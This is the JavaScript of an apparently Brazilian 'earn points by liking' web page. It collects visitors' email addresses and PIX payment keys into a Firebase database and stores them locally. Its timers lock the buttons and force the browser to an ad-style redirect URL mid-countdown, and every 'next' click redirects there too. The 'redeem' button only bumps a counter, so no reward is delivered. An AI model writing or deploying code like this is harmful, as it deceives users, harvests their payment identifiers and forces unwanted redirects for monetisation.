<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getAuth, signInAnonymously, signOut, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
import { getFirestore, doc, setDoc, updateDoc, increment } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyCA_Vatr685QLHRI6M-X2Xt_0mH_YM-IeA",
  authDomain: "atitude-solidaria.firebaseapp.com",
  projectId: "atitude-solidaria",
  storageBucket: "atitude-solidaria.firebasestorage.app",
  messagingSenderId: "651411468618",
  appId: "1:651411468618:web:ba3a2fde60b3be1b69d1b3"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

let uid = null;
let authReady = false;

signInAnonymously(auth).catch(()=>{});

onAuthStateChanged(auth,(user)=>{
  if(user){
    uid = user.uid;
    authReady = true;
  }
});

window.logout = async function(){
  try{ await signOut(auth); }catch(e){}
  localStorage.clear();
  location.reload();
}

window.login = async function(){
  if(!email.value || !pix.value){
    alert("Preencha tudo");
    return;
  }

  localStorage.setItem("email",email.value);
  localStorage.setItem("pix",pix.value);

  uEmail.innerText = email.value;
  uPix.innerText   = pix.value;

  // NUNCA trava o fluxo
  showCard("t3");

  // Firebase roda em background
  if(authReady && uid){
    try{
      await setDoc(doc(db,"usuarios",uid),{
        email: email.value,
        pix: pix.value,
        pontos: pontos,
        criadoEm: new Date()
      },{merge:true});
    }catch(e){}
  }
}
</script>

<script>
let pontos = Number(localStorage.getItem("pontos_po")) || 0;
let timer;

window.goLogin = function(){
  if(!agree.checked){
    alert("Aceite os termos");
    return;
  }
  showCard("t2");
}

window.showCard = function(id){
  clearInterval(timer);
  document.querySelectorAll(".card").forEach(c=>c.classList.remove("active"));
  document.getElementById(id).classList.add("active");
  updatePts();

  if(id==="t3") startTimer(30,"timer30",["like","dislike"],true);
  if(id==="t4") startTimer(10,"timer10a",["uSim","uNao"]);
  if(id==="t5") startTimer(10,"timer10b",["iSim","iNao"]);
  if(id==="t6") startTimer(10,"timer10c",["btnResgate"]);
}

function updatePts(){
  document.querySelectorAll(".pts")
    .forEach(e=>e.innerText=pontos.toString().padStart(4,"0"));
}

function startTimer(s,id,btns,dl){
  let t=s;
  const d=document.getElementById(id);
  btns.forEach(b=>document.getElementById(b).disabled=true);

  timer=setInterval(()=>{
    t--;
    d.innerText=t;

    if(dl && t===20){
      location.href="https://otieu.com/4/10454714";
    }

    if(t<=0){
      clearInterval(timer);
      btns.forEach(b=>document.getElementById(b).disabled=false);
    }
  },1000);
}

window.next = function(p){
  location.href="https://otieu.com/4/10454714";
  setTimeout(()=>showCard(p),800);
}

window.resgatar = async function(){
  pontos++;
  localStorage.setItem("pontos_po",pontos);
  updatePts();

  if(typeof uid === "string"){
    try{
      await updateDoc(doc(db,"usuarios",uid),{
        pontos: increment(1)
      });
    }catch(e){}
  }

  btnResgate.style.display="none";
  ok.style.display="block";
}

updatePts();
</script>